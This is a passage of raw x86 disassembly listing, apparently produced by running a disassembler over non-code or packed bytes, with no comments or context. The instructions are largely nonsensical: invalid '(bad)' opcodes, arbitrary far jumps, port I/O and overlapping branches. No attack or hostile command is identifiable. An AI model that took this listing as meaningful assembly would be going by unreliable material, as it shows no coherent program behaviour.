  404195:	cmp    cl,BYTE PTR [ebp-0x757841d9]
  40419b:	aas    
  40419c:	cmp    dh,dl
  40419e:	add    bl,BYTE PTR [ecx]
  4041a0:	mov    ebp,0x8b21562d
  4041a5:	pop    ss
  4041a6:	inc    eax
  4041a7:	je     0x40420b
  4041a9:	and    eax,0xca20305e
  4041ae:	retf   0xdbee
  4041b1:	outs   dx,DWORD PTR ds:[esi]
  4041b2:	xor    BYTE PTR [eax],al
  4041b4:	stos   DWORD PTR es:[edi],eax
  4041b5:	dec    edx
  4041b6:	in     eax,dx
  4041b7:	sub    DWORD PTR [ebx],ebx
  4041b9:	sub    eax,0xf4a86510
  4041be:	sti    
  4041bf:	in     eax,dx
  4041c0:	data16 cmc 
  4041c2:	mov    DWORD PTR [esi+edx*8],eax
  4041c5:	jns    0x40421c
  4041c7:	arpl   WORD PTR [ebx+0x1540aded],si
  4041cd:	and    DWORD PTR [edi],edi
  4041cf:	xchg   esp,eax
  4041d0:	push   eax
  4041d1:	stc    
  4041d2:	or     DWORD PTR [ecx-0x74],ebx
  4041d5:	(bad)  
  4041d6:	sahf   
  4041d7:	js     0x4041f6
  4041d9:	out    0xd3,eax
  4041db:	dec    esp
  4041dc:	in     eax,dx
  4041dd:	aas    
  4041de:	test   BYTE PTR [edx],0x11
  4041e1:	pusha  
  4041e2:	sahf   
  4041e3:	rcl    DWORD PTR [esi-0x142b04f0],1
  4041e9:	dec    esp
  4041ea:	mov    ah,0x93
  4041ec:	dec    eax
  4041ed:	fmul   QWORD PTR [eax+0x1a3cee59]
  4041f3:	mov    edi,edi
  4041f5:	std    
  4041f6:	and    al,dh
  4041f8:	out    0xe7,eax
  4041fa:	shl    esi,cl
  4041fc:	mov    dh,0x62
  4041fe:	or     DWORD PTR [eax-0x17ab341],0x6
  404205:	push   ebx
  404206:	leave  
  404207:	cdq    
  404208:	push   esp
  404209:	addr16 jnp 0x4041b3
  40420c:	jg     0x40423a
  40420e:	fldcw  WORD PTR [ecx]
  404210:	pop    edx
  404211:	je     0x4041d0
  404213:	sbb    al,0xd6
  404215:	xchg   edi,eax
  404216:	rcr    BYTE PTR [edx+0x5833862e],1
  40421c:	shr    DWORD PTR [ebx+edi*2+0x316cf777],cl
  404223:	mov    al,0x9
  404225:	in     eax,0xd7
  404227:	clc    
  404228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404229:	jle    0x4041d5
  40422b:	ss stc 
  40422d:	inc    edi
  40422e:	mov    al,ds:0x5c1f904d
  404233:	lds    ebp,FWORD PTR [ebx]
  404235:	add    BYTE PTR [esi-0x52],bl
  404238:	push   ebx
  404239:	xor    DWORD PTR [eax+0x544a26c5],ebx
  40423f:	cmp    esi,DWORD PTR [eax]
  404241:	aam    0x56
  404243:	sub    bl,BYTE PTR [eax+0x18ed52a0]
  404249:	gs ja  0x404289
  40424c:	cs dec edi
  40424e:	loop   0x4041de
  404250:	mov    al,ds:0x9bed83b
  404255:	cmp    al,0xac
  404257:	pusha  
  404258:	or     eax,0x9f3e80de
  40425d:	clc    
  40425e:	clc    
  40425f:	shr    ebx,0x9
  404262:	jnp    0x4042bc
  404264:	or     DWORD PTR [edx-0x64],edx
  404267:	mov    ebp,0x16d7f599
  40426c:	fild   QWORD PTR [edi-0x266e1b51]
  404272:	dec    ecx
  404273:	ds ja  0x40420e
  404276:	fld    DWORD PTR [edi-0x3830e919]
  40427c:	inc    edi
  40427d:	loop   0x404279
  40427f:	in     eax,dx
  404280:	or     DWORD PTR [esi-0x4f6f18c6],esi
  404286:	or     eax,0x1eace7e2
  40428b:	cmp    DWORD PTR [eax+0x73],ebx
  40428e:	cdq    
  40428f:	addr16 inc ebx
  404291:	(bad)  
  404292:	lods   eax,DWORD PTR ds:[esi]
  404293:	popa   
  404294:	mov    ah,0x43
  404296:	gs mov edx,0x51885154
  40429c:	jbe    0x404223
  40429e:	push   ds
  40429f:	sbb    BYTE PTR [ebp-0x47],cl
  4042a2:	cld    
  4042a3:	pop    edi
  4042a4:	and    ah,BYTE PTR [ecx+0x4702b25e]
  4042aa:	and    dh,BYTE PTR [ecx+eax*4-0x4]
  4042ae:	iret   
  4042af:	push   ebp
  4042b0:	mov    bh,0xea
  4042b2:	or     eax,DWORD PTR [ebx]
  4042b4:	loop   0x404298
  4042b6:	mov    bl,0x3e
  4042b8:	mov    ecx,0x3082f599
  4042bd:	sub    eax,0xbc4e492e
  4042c2:	test   al,0xa1
  4042c4:	ficomp WORD PTR [edx+edi*4+0x6541580d]
  4042cb:	push   ss
  4042cc:	pop    edx
  4042cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042ce:	mov    ah,0x3b
  4042d0:	scas   eax,DWORD PTR es:[edi]
  4042d1:	out    0x7b,eax
  4042d3:	and    edx,DWORD PTR [esi+0x3a]
  4042d6:	pop    esi
  4042d7:	or     edx,ebp
  4042d9:	in     al,dx
  4042da:	push   esp
  4042db:	pop    esi
  4042dc:	sub    BYTE PTR [ebp+ebp*2-0x15],bh
  4042e0:	mov    BYTE PTR [esi-0x459a1b71],ah
  4042e6:	and    al,0xd1
  4042e8:	xor    al,0x2c
  4042ea:	lahf   
  4042eb:	and    DWORD PTR [ebp+ecx*1-0x8],eax
  4042ef:	ja     0x4042f7
  4042f1:	push   esi
  4042f2:	imul   ebx,DWORD PTR [edi+0x2a],0xffffffbb
  4042f6:	or     BYTE PTR [esi-0x78879525],ch
  4042fc:	dec    ebp
  4042fd:	enter  0xcae4,0xa8
  404301:	jb     0x4042d6
  404303:	sub    al,0xd6
  404305:	and    BYTE PTR [esi-0x5d],ch
  404308:	or     cl,BYTE PTR [ecx+0x51]
  40430b:	and    DWORD PTR [edx-0x188e6186],eax
  404311:	rcl    BYTE PTR [edx],0x4e
  404314:	fincstp 
  404316:	xor    eax,DWORD PTR [ebx+eiz*8-0x4e]
  40431a:	pop    esi
  40431b:	push   eax
  40431c:	int3   
  40431d:	xlat   BYTE PTR ds:[ebx]
  40431e:	test   eax,esi
  404320:	scas   al,BYTE PTR es:[edi]
  404321:	out    dx,al
  404322:	jecxz  0x4042bf
  404324:	iret   
  404325:	pop    esi
  404326:	jecxz  0x40432c
  404328:	sbb    al,0x85
  40432a:	mov    bh,0x6e
  40432c:	shl    BYTE PTR [edx-0x80],cl
  40432f:	int    0x51
  404331:	mov    ah,0x6d
  404333:	neg    BYTE PTR [edi+0x1b]
  404336:	dec    ebp
  404337:	test   al,0x54
  404339:	add    DWORD PTR [esp+esi*2+0x1470826b],ecx
  404340:	int3   
  404341:	daa    
  404342:	jmp    0xd8c17455
  404347:	add    al,BYTE PTR [edx+0x6f4ae6dd]
  40434d:	popa   
  40434e:	aad    0x66
  404350:	lahf   
  404351:	push   esi
  404352:	sbb    dh,BYTE PTR [ecx]
  404354:	add    al,0xcc
  404356:	xor    BYTE PTR [eax-0x1f85e30b],0x26
  40435d:	xor    ebx,DWORD PTR [edx]
  40435f:	cdq    
  404360:	fdivr  st,st(1)
  404362:	ss xchg ebx,eax
  404364:	mov    WORD PTR [ecx],ss
  404366:	xor    eax,0xb08c432b
  40436b:	js     0x4042ff
  40436d:	push   eax
  40436e:	daa    
  40436f:	cmp    bl,BYTE PTR [ebx-0x4c866c0c]
  404375:	mov    esp,0x1257ffe7
  40437a:	outs   dx,DWORD PTR ds:[esi]
  40437b:	rcl    BYTE PTR [ecx+0x22],cl
  40437e:	pop    edi
  40437f:	stos   DWORD PTR es:[di],eax
  404381:	lods   eax,DWORD PTR ds:[esi]
  404382:	xchg   edi,eax
  404383:	test   DWORD PTR [edx+0x22],ebx
  404386:	inc    edi
  404387:	inc    eax
  404388:	call   0xd905:0xfe3eb6e1
  40438f:	and    esi,0x70
  404392:	add    edx,esi
  404394:	cwde   
  404395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404396:	mov    eax,ds:0xf91dcf64
  40439b:	add    eax,0x506ef07b
  4043a0:	sti    
  4043a1:	loop   0x4043ad
  4043a3:	das    
  4043a4:	inc    ebx
  4043a5:	xor    BYTE PTR [esi],dl
  4043a7:	imul   ebx,DWORD PTR [ecx+0x752a31e6],0x651b8ab9
  4043b1:	mov    ch,0xda
  4043b3:	ins    BYTE PTR es:[edi],dx
  4043b4:	jae    0x404353
  4043b6:	pop    ebp
  4043b7:	cdq    
  4043b8:	mov    WORD PTR [ecx],?
  4043ba:	mov    dl,0x2
  4043bc:	jmp    0x2156:0xfcf5d899
  4043c3:	dec    esp
  4043c4:	inc    ecx
  4043c5:	jmp    0xfe09:0xf5f84ade
  4043cc:	pop    es
  4043cd:	adc    al,0x81
  4043cf:	ss jmp 0xf73cffec
  4043d5:	jo     0x4043a7
  4043d7:	mov    cl,0x45
  4043d9:	js     0x40444f
  4043db:	inc    ebp
  4043dc:	mov    esi,0xe3ede1e6
  4043e1:	(bad)  
  4043e2:	cld    
  4043e3:	popa   
  4043e4:	dec    edi
  4043e5:	fnsave [ebx-0x10]
  4043e8:	(bad)
  4043eb:	(bad)  
  4043ec:	sbb    eax,0x2d01f073
  4043f1:	jae    0x4043bd
  4043f3:	mov    cl,0xea
  4043f5:	aam    0xb
  4043f7:	cwde   
  4043f8:	aaa    
  4043f9:	addr16 mov edi,0x2b6a16f5
  4043ff:	retf   
  404400:	pop    edi
  404401:	out    dx,eax
  404402:	int3   
  404403:	pop    es
  404404:	retf   0x157d
  404407:	add    ebx,DWORD PTR [eax+0x183f0393]
  40440d:	popf   
  40440e:	jbe    0x4043d2
  404410:	inc    esi
  404411:	outs   dx,BYTE PTR ds:[esi]
  404412:	mov    eax,0x170b0c3e
  404417:	ret    0xacee
  40441a:	jo     0x4043d1
  40441c:	arpl   WORD PTR [eax-0x3d],di
  40441f:	bound  esp,QWORD PTR [eax+ecx*1-0x6c89bf1d]
  404426:	mov    WORD PTR [edi],?
  404428:	add    bh,cl
  40442a:	dec    esi
  40442b:	cli    
  40442c:	jmp    0x6904:0xa4cb9bb4
  404433:	(bad)  
  404434:	jmp    0x6b64d802
  404439:	in     al,dx
  40443a:	(bad)  [ebp+0x1]
  40443d:	jge    0x4043f6
  40443f:	xchg   DWORD PTR [eax],ebp
  404441:	adc    al,0x71
  404443:	gs data16 scas al,BYTE PTR es:[edi]
  404446:	bound  eax,QWORD PTR [ecx-0x3e070fda]
  40444c:	cmp    BYTE PTR [eax-0x2f],0xfc
  404450:	hlt    
  404451:	ins    BYTE PTR es:[edi],dx
  404452:	pop    ss
  404453:	push   0xffffffbb
  404455:	add    ebp,DWORD PTR [eax-0x23]
  404458:	outs   dx,DWORD PTR ds:[esi]
  404459:	add    DWORD PTR [edx],eax
  40445b:	dec    ah
  40445d:	loopne 0x40446d
  40445f:	stos   DWORD PTR es:[edi],eax
  404460:	ss jno 0x404476
  404463:	daa    
  404464:	jno    0x404407
  404466:	push   0xee508162
  40446b:	stc    
  40446c:	add    al,0xed
  40446e:	(bad)  
  40446f:	xchg   esp,eax
  404470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404471:	scas   al,BYTE PTR es:[edi]
  404472:	imul   edx,DWORD PTR [ebp+0x707719da],0xffffffd6
  404479:	retf   
  40447a:	int3   
  40447b:	shl    esp,1
  40447d:	or     DWORD PTR [ecx],edi
  40447f:	xor    BYTE PTR [ecx],al
  404481:	faddp  st(7),st
  404483:	hlt    
  404484:	mov    bh,0xd
  404486:	xor    bl,BYTE PTR [ebp*2+0x5d02010a]
  40448d:	stos   BYTE PTR es:[edi],al
  40448e:	inc    edi
  40448f:	aad    0x41
  404491:	ret    
  404492:	or     cl,bh
  404494:	mov    bh,0xfa
  404496:	mov    bh,0x59
  404498:	push   es
  404499:	jge    0x404505
  40449b:	and    al,0x18
  40449d:	ret    0x65d6
  4044a0:	test   eax,0xf65e8cc2
  4044a5:	fistp  QWORD PTR [esi-0x44]
  4044a8:	shr    BYTE PTR [edx-0x68],0x31
  4044ac:	push   cs
  4044ad:	cmp    DWORD PTR [edx],edi
  4044af:	and    edx,DWORD PTR [edi]
  4044b1:	ss (bad) 
  4044b3:	jns    0x404510
  4044b5:	inc    edx
  4044b6:	dec    edi
  4044b7:	sbb    DWORD PTR [edx-0x71],esp
  4044ba:	loopne 0x4044c9
  4044bc:	imul   esp,edx,0x474160fa
  4044c2:	popa   
  4044c3:	retf   0x8c35
  4044c6:	inc    ecx
  4044c7:	outs   dx,BYTE PTR ds:[esi]
  4044c8:	fmul   QWORD PTR [eax+ebx*4-0x31]
  4044cc:	jge    0x40445d
  4044ce:	jb     0x404482
  4044d0:	mov    eax,ds:0x1251dd59
  4044d5:	enter  0x3737,0xbb
  4044d9:	jne    0x404503
  4044db:	adc    bh,BYTE PTR [ebp-0x67c158a6]
  4044e1:	push   0xffffffbc
  4044e3:	sahf   
  4044e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044e5:	adc    BYTE PTR [ebx+0x6d],ch
  4044e8:	or     DWORD PTR [ecx+0x1f],edx
  4044eb:	mov    dh,0xee
  4044ed:	add    BYTE PTR [eax],dl
  4044ef:	inc    esi
  4044f0:	mov    ch,0xc7
  4044f2:	retf   
  4044f3:	cmp    al,0x9a
  4044f5:	shl    dl,0xe1
  4044f8:	loopne 0x404529
  4044fa:	fcomp  st(4)
  4044fc:	sbb    al,0x95
  4044fe:	or     eax,0xab997222
  404503:	shl    ebp,1
  404505:	mov    ebx,0x8f987003
  40450a:	sub    BYTE PTR [esi+edi*1-0x5e],al
  40450e:	nop
  40450f:	push   ebp
  404510:	jmp    0x3f5b:0x96604aba
  404517:	loop   0x40457d
  404519:	sub    eax,0x66de1a8b
  40451e:	and    al,0xf7
  404520:	sub    eax,DWORD PTR [esp+eax*2+0x3bed6564]
  404527:	pop    esi
  404528:	and    eax,0x28c1cc46
  40452d:	icebp  
  40452e:	enter  0xa43,0x3e
  404532:	jl     0x4044e9
  404534:	ret    0xc904
  404537:	mov    ecx,0x17c5bb0a
  40453c:	icebp  
  40453d:	jb     0x40451e
  40453f:	bound  ecx,QWORD PTR [ebx-0x1db5c3f8]
  404545:	(bad)  
  404546:	adc    BYTE PTR [ecx+0x3],dl
  404549:	inc    edx
  40454a:	cdq    
  40454b:	sub    al,0x21
  40454d:	or     al,0xb0
  40454f:	shr    dh,cl
  404551:	cmc    
  404552:	test   ah,bh
  404554:	push   esi
  404555:	mov    ecx,DWORD PTR [eax-0x4f3b9c64]
  40455b:	sti    
  40455c:	mov    si,0xac8b
  404560:	imul   edx,ebp,0xffffff99
  404563:	push   ds
  404564:	sub    al,0xd7
  404566:	mov    edi,0x393307a2
  40456b:	sti    
  40456c:	sar    DWORD PTR [eax+0x8666934],cl
  404572:	mov    ah,0x6a
  404574:	(bad)  
  404576:	jmp    0x40457b
  404578:	in     al,0x12
  40457a:	add    eax,0xdaa1d687
  40457f:	fsub   QWORD PTR [ebx]
  404581:	inc    ecx
  404582:	adc    edx,DWORD PTR [ebp-0x14090b41]
  404588:	jmp    0xeefe807
  40458d:	fdivr  QWORD PTR [edx]
  40458f:	jno    0x404588
  404591:	call   0x4236:0xe018ea1c
  404598:	sbb    ebp,DWORD PTR [esp+eax*1-0x1182800f]
  40459f:	rcr    edx,cl
  4045a1:	xor    eax,0x28306e4b
  4045a6:	mov    ch,0x53
  4045a8:	and    DWORD PTR [ebx+0x33],edx
  4045ab:	stc    
  4045ac:	xchg   esi,eax
  4045ad:	ret    
  4045ae:	sbb    DWORD PTR [esi],edx
  4045b0:	push   ebx
  4045b1:	cmp    BYTE PTR [ebx+0x5df95399],0x1f
  4045b8:	and    dh,cl
  4045ba:	ficom  DWORD PTR [edx]
  4045bc:	or     esi,eax
  4045be:	sbb    esi,DWORD PTR [ebp-0x79]
  4045c1:	cwde   
  4045c2:	jno    0x4045ad
  4045c4:	add    esi,edi
  4045c6:	pushf  
  4045c7:	aam    0x23
  4045c9:	pop    edi
  4045ca:	aaa    
  4045cb:	jp     0x404610
  4045cd:	das    
  4045ce:	imul   ecx,DWORD PTR [ebp+0xaeac81e],0xe1a13b31
  4045d8:	jmp    0xae9f1a3
  4045dd:	popa   
  4045de:	jp     0x404567
  4045e0:	mov    ah,0xb0
  4045e2:	mov    ebx,0x85c2d6f4
  4045e7:	xchg   ebp,eax
  4045e8:	add    cl,BYTE PTR [ebx+0x67]
  4045eb:	add    BYTE PTR [edx+0x74a3f43],bh
  4045f1:	(bad)
  4045f4:	and    ah,ah
  4045f6:	jge    0x404590
  4045f8:	jl     0x4045e5
  4045fa:	pop    edi
  4045fb:	and    ch,BYTE PTR [ebx]
  4045fd:	daa    
  4045fe:	adc    dl,BYTE PTR [eax-0x5afbde54]
  404604:	or     BYTE PTR [edx-0x3611a986],dl
  40460a:	xor    eax,0x3fdfc75
  40460f:	ss sbb edi,esp
  404612:	add    ecx,DWORD PTR [edx]
  404614:	push   ebx
  404615:	xor    ah,BYTE PTR [edi+0x199ba91b]
  40461b:	icebp  
  40461c:	dec    edi
  40461d:	xor    al,0xed
  40461f:	mov    eax,0x735390a5
  404624:	pop    edx
  404625:	stos   DWORD PTR es:[edi],eax
  404626:	push   eax
  404627:	(bad)  
  404628:	adc    edi,edx
  40462a:	xchg   ebx,eax
  40462b:	or     edx,ebp
  40462d:	pop    ecx
  40462e:	lods   eax,DWORD PTR ds:[esi]
  40462f:	(bad)  
  404630:	jmp    0x404606
  404632:	pushf  
  404633:	loop   0x404637
  404635:	fimul  WORD PTR [ebp+eax*8-0x26]
  404639:	in     al,dx
  40463a:	jle    0x404641
  40463c:	ins    DWORD PTR es:[edi],dx
  40463d:	sbb    DWORD PTR [edx+0x8],edi
  404640:	or     edi,DWORD PTR [ecx]
  404642:	aas    
  404643:	test   eax,ebx
  404645:	cs std 
  404647:	test   eax,0x908b9c7e
  40464c:	xchg   esp,eax
  40464d:	addr16 and esi,edx
  404650:	inc    edx
  404651:	cmp    al,0xbd
  404653:	ja     0x4045e3
  404655:	stos   DWORD PTR es:[edi],eax
  404656:	jbe    0x404693
  404658:	and    BYTE PTR [ebp-0x58],ah
  40465b:	jle    0x404676
  40465d:	jp     0x40465f
  40465f:	scas   eax,DWORD PTR es:[edi]
  404660:	sub    DWORD PTR [esi],0xf0fcfe73
  404666:	dec    ecx
  404667:	or     al,0x5
  404669:	xchg   esp,eax
  40466a:	or     eax,0xcf7fa12d
  40466f:	mov    DWORD PTR [edx+eiz*4-0x31e3c0d0],edi
  404676:	(bad)  
  404678:	xchg   ecx,eax
  404679:	lahf   
  40467a:	mov    ebx,esp
  40467c:	push   0x52f3e3ae
  404681:	leave  
  404682:	pop    ds
  404683:	push   eax
  404684:	(bad)  [edx+0x2b10a15d]
  40468a:	pushf  
  40468b:	mov    eax,0x77664613
  404690:	mov    ebp,0xe4bc14be
  404695:	bound  ecx,QWORD PTR [edx+0x35]
  404698:	inc    ebx
  404699:	fs shl dh,1
  40469c:	aad    0xcd
  40469e:	cmp    ch,BYTE PTR [ebx-0x5b97ee92]
  4046a4:	or     esi,eax
  4046a6:	and    dh,0xf5
  4046a9:	sbb    ah,bl
  4046ab:	mov    esi,0x9e5acfbf
  4046b0:	jg     0x404650
  4046b2:	dec    edx
  4046b3:	mov    DWORD PTR [edx-0x7c8ae22c],esi
  4046b9:	push   esi
  4046ba:	inc    edi
  4046bb:	fidivr DWORD PTR [eax]
  4046bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046be:	mov    edx,0x920f6056
  4046c3:	add    esp,ebp
  4046c5:	cld    
  4046c6:	popf   
  4046c7:	lods   eax,DWORD PTR ds:[esi]
  4046c8:	adc    al,0xd1
  4046ca:	outs   dx,BYTE PTR cs:[esi]
  4046cc:	pop    edx
  4046cd:	push   ecx
  4046ce:	push   0xb5e620c3
  4046d3:	bound  eax,QWORD PTR [edi+0x31]
  4046d6:	int    0x10
  4046d8:	mov    DWORD PTR [eax+0x3b],ecx
  4046db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046dc:	iret   
  4046dd:	outs   dx,DWORD PTR ds:[esi]
  4046de:	jge    0x4046d0
  4046e0:	jle    0x40472d
  4046e2:	adc    BYTE PTR [esi-0x3d],ah
  4046e5:	scas   eax,DWORD PTR es:[edi]
  4046e6:	test   dh,bl
  4046e8:	push   edx
  4046e9:	popf   
  4046ea:	ret    
  4046eb:	call   0x61a2:0x9030b731
  4046f2:	out    0x3d,al
  4046f4:	inc    esi
  4046f5:	test   DWORD PTR [edi-0x4b],esp
  4046f8:	xchg   ecx,eax
  4046f9:	out    0x8d,al
  4046fb:	scas   al,BYTE PTR es:[edi]
  4046fc:	sub    BYTE PTR [edi],dh
  4046fe:	ja     0x4046e6
  404700:	mov    edx,0x8b291e58
  404705:	je     0x40477e
  404707:	scas   eax,DWORD PTR es:[edi]
  404708:	(bad)  
  404709:	das    
  40470a:	cmc    
  40470b:	adc    ch,BYTE PTR [ebp-0xe8fccb6]
  404711:	mov    edx,0xc04d34d2
  404716:	push   DWORD PTR [ebp-0x38b4cbc2]
  40471c:	mov    BYTE PTR [ebp-0x30db8b95],ah
  404722:	ins    DWORD PTR es:[edi],dx
  404723:	inc    ebp
  404724:	xchg   ebp,eax
  404725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404726:	pop    ebp
  404727:	outs   dx,BYTE PTR ds:[esi]
  404728:	gs jecxz 0x40478a
  40472b:	xchg   ecx,eax
  40472c:	ins    DWORD PTR es:[edi],dx
  40472d:	dec    esi
  40472e:	push   esp
  40472f:	push   edi
  404730:	push   eax
  404731:	aam    0x23
  404733:	inc    esi
  404734:	int3   
  404735:	jp     0x4046e7
  404737:	sbb    DWORD PTR [edx+0x73],0xf2ec93cc
  40473e:	mov    ah,BYTE PTR [edi+0x4ba1fbce]
  404744:	or     eax,0xba9403eb
  404749:	push   edx
  40474a:	nop
  40474b:	dec    ecx
  40474c:	xor    al,0x4c
  40474e:	jmp    0x7a07:0x62c427f7
  404755:	xlat   BYTE PTR ds:[ebx]
  404756:	outs   dx,BYTE PTR ds:[esi]
  404757:	loopne 0x4047b6
  404759:	mov    WORD PTR [ebp-0x7380e63e],es
  40475f:	xchg   ebp,eax
  404760:	mov    edi,0xf42f394c
  404765:	arpl   WORD PTR [edi+0x23],di
  404768:	retf   0xc420
  40476b:	rcl    ebp,cl
  40476d:	test   al,0xd1
  40476f:	mov    cl,0x80
  404771:	test   cl,0xb
  404774:	mov    ebx,0x63d87a2
  404779:	int    0x2c
  40477b:	rcl    edx,0x49
  40477e:	xlat   BYTE PTR ds:[ebx]
  40477f:	and    BYTE PTR [esi],ch
  404781:	jo     0x404780
  404783:	and    eax,0x9994e4c7
  404788:	dec    eax
  404789:	ins    BYTE PTR es:[edi],dx
  40478a:	mov    ebx,0xee90c69f
  40478f:	sbb    eax,0xda0d3471
  404794:	test   bl,bl
  404796:	fcom   DWORD PTR [eax-0x2ffd6175]
  40479c:	enter  0x3de0,0x7e
  4047a0:	and    eax,0xbab6b85c
  4047a5:	inc    esi
  4047a6:	pusha  
  4047a7:	arpl   WORD PTR [edx+0x1],si
  4047aa:	or     al,0xd7
  4047ac:	or     ch,ch
  4047ae:	repz push 0x2a
  4047b1:	push   ds
  4047b2:	test   al,0x1
  4047b4:	stos   DWORD PTR es:[edi],eax
  4047b5:	cwde   
  4047b6:	in     al,0xe4
  4047b8:	pop    edx
  4047b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ba:	pop    ds
  4047bb:	xor    bl,BYTE PTR [ebp-0x68]
  4047be:	or     BYTE PTR [esi],cl
  4047c0:	clc    
  4047c1:	scas   al,BYTE PTR es:[edi]
  4047c2:	or     edx,esp
  4047c4:	add    eax,0x400e12d7
  4047c9:	jl     0x4047bc
  4047cb:	ror    DWORD PTR [edx+0x72],1
  4047ce:	ss nop
  4047d0:	push   ebp
  4047d1:	cmp    DWORD PTR [edi-0x47],ecx
  4047d4:	sub    BYTE PTR [eax-0x2e],al
  4047d7:	ins    DWORD PTR es:[edi],dx
  4047d8:	div    edx
  4047da:	sub    DWORD PTR cs:[edx-0x1f79ee],edx
  4047e1:	mov    ds:0xf50ecc37,eax
  4047e6:	cmp    ecx,ecx
  4047e8:	inc    eax
  4047e9:	pop    ebp
  4047ea:	loop   0x404793
  4047ec:	or     cl,BYTE PTR [edx]
  4047ee:	aaa    
  4047ef:	push   ebx
  4047f0:	ins    DWORD PTR es:[edi],dx
  4047f1:	jmp    0x29adc9cc
  4047f6:	bound  esp,QWORD PTR [edi+esi*1+0x4680a1fe]
  4047fd:	sub    edx,DWORD PTR [ebp+0x4c6f5e87]
  404803:	test   al,0x51
  404805:	mul    ebx
  404807:	or     eax,0xeb4e9250
  40480d:	xor    BYTE PTR [esi],bl
  40480f:	inc    edi
  404810:	cmp    DWORD PTR [ebx],ebx
  404812:	push   ss
  404813:	cmp    BYTE PTR [esi-0x53c2edc4],al
  404819:	je     0x40488b
  40481b:	sub    dl,BYTE PTR [ebp+0x16]
  40481e:	retf   
  40481f:	int3   
  404820:	xor    DWORD PTR [ebp-0xd],ebp
  404823:	cmp    eax,0xa8802da5
  404828:	lock jmp 0x4392045b
  40482e:	jge    0x404800
  404830:	and    DWORD PTR [ecx+0x56b7e8a2],ebx
  404836:	sub    eax,0x86d7d1fe
  40483b:	dec    esi
  40483c:	or     al,0x4e
  40483e:	and    DWORD PTR [esi],ebx
  404840:	and    eax,0xb9ef9110
  404845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404846:	lock mov ecx,0xb96bcbf1
  40484c:	retf   
  40484d:	sbb    DWORD PTR [ebp-0x23459e47],eax
  404853:	jb     0x4047e7
  404855:	and    dl,dh
  404857:	jbe    0x40488b
  404859:	aad    0xae
  40485b:	data16 xor al,0x94
  40485e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40485f:	pop    edx
  404860:	scas   eax,DWORD PTR es:[edi]
  404861:	xchg   esi,eax
  404862:	cmp    ebp,ecx
  404864:	rep lods al,BYTE PTR ds:[esi]
  404866:	push   ecx
  404867:	js     0x4048e7
  404869:	fcom   DWORD PTR [esi-0x2]
  40486c:	sub    BYTE PTR ss:[edi-0x5],0x84
  404871:	cmp    eax,0x4d720152
  404876:	jmp    0x1260:0x55f04e2b
  40487d:	or     BYTE PTR [eax+0x491f8b3a],bh
  404883:	(bad)  
  404884:	jl     0x40488a
  404886:	imul   ch
  404888:	inc    ecx
  404889:	cmp    eax,0xe0d9b4a5
  40488e:	push   esp
  40488f:	xor    ebp,DWORD PTR [esi+eiz*2-0x52]
  404893:	test   al,0x5e
  404895:	mov    gs,WORD PTR ss:0x4d3b514a
  40489c:	push   edi
  40489d:	mov    esp,0xd2cca835
  4048a2:	jae    0x4048f4
  4048a4:	ret    
  4048a5:	push   eax
  4048a6:	test   BYTE PTR [edx],dl
  4048a8:	inc    ecx
  4048a9:	and    eax,0x70c256db
  4048ae:	stc    
  4048af:	je     0x404895
  4048b1:	mov    ebp,0x92128536
  4048b6:	dec    ecx
  4048b7:	sbb    esi,DWORD PTR fs:[eax]
  4048ba:	(bad)  
  4048bb:	rcr    DWORD PTR [eax],cl
  4048bd:	pop    esi
  4048be:	in     al,0x1d
  4048c0:	mov    ds:0xae7aae65,eax
  4048c5:	or     eax,0xdb8d7e3
  4048ca:	into   
  4048cb:	mov    ebx,0xb7812b40
  4048d0:	scas   eax,DWORD PTR es:[edi]
  4048d1:	mov    bl,0xd9
  4048d3:	es dec eax
  4048d5:	xor    al,0x8
  4048d7:	push   bx
  4048d9:	inc    edi
  4048da:	sbb    DWORD PTR [eax],esp
  4048dc:	rcl    BYTE PTR [ecx+ebp*2-0x51],cl
  4048e0:	cmc    
  4048e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e2:	and    al,0x55
  4048e4:	lock jb 0x40494a
  4048e7:	aas    
  4048e8:	xchg   edi,eax
  4048e9:	add    al,0x3
  4048eb:	aad    0xf2
  4048ed:	mov    al,0x65
  4048ef:	dec    edx
  4048f0:	push   0xffffff96
  4048f2:	jmp    0xd74ea25b
  4048f7:	lea    ebp,[ebp+0x32481951]
  4048fd:	jne    0x404884
  4048ff:	fcomp  QWORD PTR [edi]
  404901:	ins    BYTE PTR es:[edi],dx
  404902:	sub    bh,BYTE PTR [eax-0x66453999]
  404908:	pushf  
  404909:	sub    al,0x50
  40490b:	mov    esp,edx
  40490d:	aam    0x3
  40490f:	cmc    
  404910:	outs   dx,DWORD PTR ds:[esi]
  404911:	into   
  404912:	imul   esi,eax,0xdaa417b9
  404918:	jnp    0x404923
  40491a:	jns    0x4048e0
  40491c:	add    edi,DWORD PTR [ebp-0x53]
  40491f:	out    dx,al
  404920:	sti    
  404921:	cli    
  404922:	jmp    0xf72b:0xc6904e53
  404929:	sahf   
  40492a:	loop   0x40495b
  40492c:	call   0xc158:0x9722f012
  404933:	out    0xe3,eax
  404935:	dec    ebp
  404936:	inc    ecx
  404937:	and    bh,BYTE PTR [ecx-0x372a3429]
  40493d:	push   ecx
  40493e:	push   0x26
  404940:	das    
  404941:	jbe    0x4048f6
  404943:	xor    eax,0xb3c9cdc2
  404948:	mov    ebx,0x2ac9a01b
  40494d:	and    ch,ch
  40494f:	ror    DWORD PTR [esi+eax*4-0xb],0x11
  404954:	cs test esp,esi
  404957:	mov    esi,0x8a1fbd11
  40495c:	sub    DWORD PTR [edx+0x5f],0x6e
  404960:	jmp    ecx
  404962:	xchg   ebx,eax
  404963:	adc    DWORD PTR [ecx-0x3328416e],esp
  404969:	jl     0x404976
  40496b:	cdq    
  40496c:	pop    es
  40496d:	mov    ebp,0x5355723f
  404972:	pop    edi
  404973:	jp     0x404934
  404975:	jle    0x4049ab
  404977:	iret   
  404978:	cmp    al,0x53
